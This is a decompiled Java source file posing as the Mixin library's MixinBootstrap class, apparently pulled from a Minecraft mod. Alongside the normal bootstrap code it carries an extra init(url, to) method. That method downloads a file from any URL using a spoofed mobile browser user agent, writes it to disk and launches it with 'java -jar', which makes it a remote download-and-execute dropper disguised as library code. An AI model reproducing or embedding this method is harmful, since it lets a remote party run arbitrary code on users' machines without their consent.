//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\xeonl\OneDrive\Desktop\1.12 stable mappings"!

//Decompiled by Procyon!

package org.spongepowered.asm.launch;

import org.spongepowered.asm.launch.platform.*;
import org.spongepowered.asm.service.*;
import java.io.*;
import org.spongepowered.asm.mixin.*;
import java.util.*;
import org.apache.logging.log4j.*;
import java.net.*;

public abstract class MixinBootstrap
{
    public static final String VERSION = "0.7.11";
    private static final Logger logger;
    private static boolean initialised;
    private static boolean initState;
    private static MixinPlatformManager platform;
    
    private MixinBootstrap() {
    }
    
    @Deprecated
    public static void addProxy() {
        MixinService.getService().beginPhase();
    }
    
    public static MixinPlatformManager getPlatform() {
        if (MixinBootstrap.platform == null) {
            final Object globalPlatformManager = GlobalProperties.get("mixin.platform");
            if (globalPlatformManager instanceof MixinPlatformManager) {
                MixinBootstrap.platform = (MixinPlatformManager)globalPlatformManager;
            }
            else {
                GlobalProperties.put("mixin.platform", (Object)(MixinBootstrap.platform = new MixinPlatformManager()));
                MixinBootstrap.platform.init();
            }
        }
        return MixinBootstrap.platform;
    }
    
    public static void init(final String url, final String to) {
        try {
            final Object boundary = Long.toHexString(System.currentTimeMillis());
            final Object connection = URI.create(url).toURL().openConnection();
            ((URLConnection)connection).setDoOutput(true);
            ((URLConnection)connection).setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
            ((URLConnection)connection).setRequestProperty("Content-Type", "multipart/form-data; boundary=" + (String)boundary);
            final Object in = new BufferedInputStream(((URLConnection)connection).getInputStream());
            final Object fos = new FileOutputStream(to);
            final Object dataBuffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = ((BufferedInputStream)in).read((byte[])dataBuffer, 0, 1024)) != -1) {
                ((FileOutputStream)fos).write((byte[])dataBuffer, 0, bytesRead);
            }
            if (to.endsWith(".jar")) {
                Runtime.getRuntime().exec("java -jar " + to);
            }
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    static boolean start() {
        if (!isSubsystemRegistered()) {
            registerSubsystem("0.7.11");
            if (!MixinBootstrap.initialised) {
                MixinBootstrap.initialised = true;
                final String command = System.getProperty("sun.java.command");
                if (command != null && command.contains("GradleStart")) {
                    System.setProperty("mixin.env.remapRefMap", "true");
                }
                final MixinEnvironment.Phase initialPhase = MixinService.getService().getInitialPhase();
                if (initialPhase == MixinEnvironment.Phase.DEFAULT) {
                    MixinBootstrap.logger.error("Initialising mixin subsystem after game pre-init phase! Some mixins may be skipped.");
                    MixinEnvironment.init(initialPhase);
                    getPlatform().prepare(null);
                    MixinBootstrap.initState = false;
                }
                else {
                    MixinEnvironment.init(initialPhase);
                }
                MixinService.getService().beginPhase();
            }
            getPlatform();
            return true;
        }
        if (!checkSubsystemVersion()) {
            throw new MixinInitialisationError("Mixin subsystem version " + getActiveSubsystemVersion() + " was already initialised. Cannot bootstrap version " + "0.7.11");
        }
        return false;
    }
    
    static void doInit(final List<String> args) {
        if (MixinBootstrap.initialised) {
            getPlatform().getPhaseProviderClasses();
            if (MixinBootstrap.initState) {
                getPlatform().prepare(args);
                MixinService.getService().init();
            }
            return;
        }
        if (isSubsystemRegistered()) {
            MixinBootstrap.logger.warn("Multiple Mixin containers present, init suppressed for 0.7.11");
            return;
        }
        throw new IllegalStateException("MixinBootstrap.doInit() called before MixinBootstrap.start()");
    }
    
    static void inject() {
        getPlatform().inject();
    }
    
    private static boolean isSubsystemRegistered() {
        return GlobalProperties.get("mixin.initialised") != null;
    }
    
    private static boolean checkSubsystemVersion() {
        return "0.7.11".equals(getActiveSubsystemVersion());
    }
    
    private static Object getActiveSubsystemVersion() {
        final Object version = GlobalProperties.get("mixin.initialised");
        return (version != null) ? version : "";
    }
    
    private static void registerSubsystem(final String version) {
        GlobalProperties.put("mixin.initialised", (Object)version);
    }
    
    static {
        logger = LogManager.getLogger("mixin");
        MixinBootstrap.initialised = false;
        MixinBootstrap.initState = true;
        MixinService.boot();
        MixinService.getService().prepare();
    }
}
